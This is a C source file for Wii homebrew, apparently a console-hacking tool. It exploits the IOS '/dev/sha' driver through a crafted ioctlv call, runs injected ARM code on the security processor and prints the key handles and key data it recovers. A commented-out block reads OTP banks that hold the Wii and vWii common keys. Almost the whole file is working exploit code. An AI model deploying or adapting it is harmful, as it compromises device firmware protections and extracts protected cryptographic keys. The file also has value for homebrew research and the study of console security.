#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ogc/machine/processor.h>
#include <ogc/ipc.h>

#include "video.h"
#include "pad.h"
#include "realcode_bin.h"

#define HW_AHBPROT		0x0D800064
#if 0
#define HW_OTPCOMMAND	0x0D8001EC
#define HW_OTPDATA		0x0D8001F0
#define LT_EFUSEPROT	0x0D800510

int otp_read(unsigned bank, unsigned offset, unsigned count, uint32_t out[count]) {
	if (bank >= 8 || offset + count > 0x20 || !out)
		return -1;

	for (unsigned i = 0; i < count; i++) {
		unsigned otp_command = 0x80000000 | (offset + i) | (bank << 8);
//		printf("otp_command: %08x\n", otp_command);

		write32(HW_OTPCOMMAND, otp_command);

		out[i] = read32(HW_OTPDATA);
	}

	return 0;
}
#endif

static uint32_t keyhandles[3] = { 4, 11, 0 };
static uint32_t keydata[4] __attribute__((aligned(0x20))) = {};

void __exception_setreload(unsigned seconds);

int main(int argc, char **argv) {
	int ret;

	__exception_setreload(30);

	puts("Hello World!");

	// printf("HW_AHBPROT: %08X\n", read32(HW_AHBPROT));
	uint16_t* const IOSVersion = (uint16_t* const)0x80003140;
	printf("reloading IOS%u v%u (v%u.%u)....\n", IOSVersion[0], IOSVersion[1], IOSVersion[1] >> 8, IOSVersion[1] & 0xFF);
	IOS_ReloadIOS(*IOSVersion);
	printf("HW_AHBPROT: %08X\n", read32(HW_AHBPROT));
	usleep(100000);


	// thank you mkwcat (<3)
	__attribute__((aligned(0x20)))
	static ioctlv shasploit[3] = {
		// Input data
		[0] = { },

		// Context pointer
		[1] = { (void *)0xFFFE0028, 0 },

		// Message digest
		/* Unused vector utilized for cache safety */
		[2] = { (void *)0x80000000, 0x40 },
	};

	// put in some code
	uint32_t* mem1 = (uint32_t *)0x80000000;

	mem1[0] = 0x4903468D;	/* ldr r1, =0x10100000; mov sp, r1; */
	mem1[1] = 0x49034788;	/* ldr r1, =entrypoint; blx r1; */
	/* Overwrite reserved handler to loop infinitely */
	mem1[2] = 0x49036209; 	/* ldr r1, =0xFFFF0014; str r1, [r1, #0x20]; */
	mem1[3] = 0x47080000;	/* bx r1 */
	mem1[4] = 0x10100000;	/* temporary stack */
	mem1[5] = MEM_VIRTUAL_TO_PHYSICAL(realcode_bin);
	mem1[6] = 0xFFFF0014;	/* reserved handler */

	uintptr_t res_ptr = (uintptr_t)&mem1[8];
	write32(res_ptr + 0, 0);
	write32(res_ptr + 4, MEM_VIRTUAL_TO_PHYSICAL(&keyhandles[2]));
	write32(res_ptr + 8, MEM_VIRTUAL_TO_PHYSICAL(keydata));

	ret = IOS_Ioctlv(0x10001, 0, 1, 2, shasploit);
	if (ret < 0) {
		printf("/dev/sha exploit failed %i\n", ret);
		return ret;
	}

	while (!read32(res_ptr))
		;

	ret = read32(res_ptr);
	if (ret != 1) {
		printf("our code failed? %i\n", read32(res_ptr + 4));
		return ret;
	}

	DCInvalidateRange(keyhandles, sizeof(keyhandles));
	DCInvalidateRange(keydata,    sizeof(keydata));
	printf("keyhandles [%08X %08X %08X]\n", keyhandles[0], keyhandles[1], keyhandles[2]);
	printf("keydata    [%08X %08X %08X %08X]\n", keydata[0], keydata[1], keydata[2], keydata[3]);


	// printf("LT_EFUSEPROT: %08X\n", read32(LT_EFUSEPROT));

	//                 bank offset count
	// Wii common key:    0      5     4
	// vWii common key:   1     20     4
/*
	for (int x = 0; x < 4; x++) {
		ret = otp_read(x, 0, 32, keydata);
		printf("otp_read(%i, 0, 8) => %i\n", x, ret);
		for (int i = 0; i < 32; i += 8)
			printf("[%08X %08X %08X %08X %08X %08X %08X %08X]\n", keydata[i+0], keydata[i+1], keydata[i+2], keydata[i+3], keydata[i+4], keydata[i+5], keydata[i+6], keydata[i+7]);

	}
*/

	return 0;
}

__attribute__((destructor))
void finished() {
	initpads();
	puts("\nmain() exited with some code. idk what");
	puts("Press any button to exit.");
	wait_button(0);
}
